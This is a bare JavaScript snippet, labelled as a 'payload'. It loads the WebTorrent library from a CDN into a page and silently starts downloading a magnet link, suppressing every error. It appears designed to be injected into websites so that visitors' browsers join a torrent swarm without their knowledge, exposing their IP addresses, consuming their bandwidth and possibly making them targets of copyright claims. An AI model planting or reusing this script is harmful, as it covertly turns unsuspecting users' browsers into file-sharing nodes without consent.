// URL to WebTorrent library
url = "https://cdn.jsdelivr.net/npm/webtorrent@latest/webtorrent.min.js";

// Append WebTorrent library to head
function loadScript(url) {
    var script = document.createElement('script');
    script.type = "text/javascript";
    script.src = url;
	script.charset = "utf-8";
	script.async = ""
    document.head.appendChild(script);
}

// Execute when ready
function whenAvailable(name, callback) {
		// Store the interval id
    var intervalId = window.setInterval(function() {
        if (window[name]) {
        		// Clear the interval id
        		window.clearInterval(intervalId);
            // Call back
            callback(window[name]);
        }
    }, 10);
}

// Payload - Create WebTorrent client and download example_music_track.mp3
function payload() {
	var torrentId = "magnet:?xt=urn:btih:b077921b8f9a7b85a920b8f55d94f2f8a4d90938&dn=example_music_track.mp3&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337&tr=udp%3A%2F%2Fexplodie.org%3A6969&tr=udp%3A%2F%2Ftracker.empire-js.us%3A1337&tr=wss%3A%2F%2Ftracker.btorrent.xyz&tr=wss%3A%2F%2Ftracker.openwebtorrent.com"
	var client = new WebTorrent()
	client.on('error', function (err) {
		//Do nothing
		})
	client.add(torrentId)
};

// Execution using callback
loadScript(url);
whenAvailable("WebTorrent", function() {
    payload()
});
